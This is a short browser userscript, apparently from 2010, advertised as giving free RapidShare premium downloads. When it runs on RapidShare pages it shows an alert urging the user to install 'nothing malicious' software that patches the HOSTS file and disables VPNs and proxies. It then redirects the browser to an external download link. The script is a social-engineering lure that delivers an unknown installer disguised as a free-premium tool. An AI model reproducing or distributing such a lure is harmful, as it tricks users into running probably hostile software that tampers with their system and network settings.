// ==UserScript==
// @name            Rapidshare Premium Free
// @namespace       provided by tee40 network
// @description     Allows you to download from RapidShare as a premium user. Each user of this script can download up to 20 RapidShare files a day as a premium user. This requires you to install software, nothing malicious, to patch your hosts file and will show small text ads at the top of each page, ONLY WHEN ENABLED.
// @author          Dan Macy
// @include         https://rapidshare.com/*
// @include         http://rapidshare.com/*
// @include         https://www.rapidshare.com/*
// @include         http://www.rapidshare.com/*
// @date            07/25/10
// @version         1.1
// ==/UserScript==

/* if <%rspf_installed%>[false] { */
alert('** This script requires you to download our free software ** \n\nDon\'t worry, nothing malicious. This is just to patch your HOSTS file and\ndisable proxies, VPNs and other IP changing software while downloading with our script.\nwe would like to remain a free service as long as possible, which the software allows us to do so.\n\nTo disable Rapidshare Premium Free, simply press CTRL\+SHIFT\+H, once installed\n\nPLEASE DO NOT ABUSE OUR SERVICE. THANK YOU.\n\nPress OK to be redirected to the software installer.');
window.location.replace('http://www.filetolink.com/9ad84bc8');
/* } elseif <%rspf_installed%>[true] { print_<%rspf_getCode%>; } */

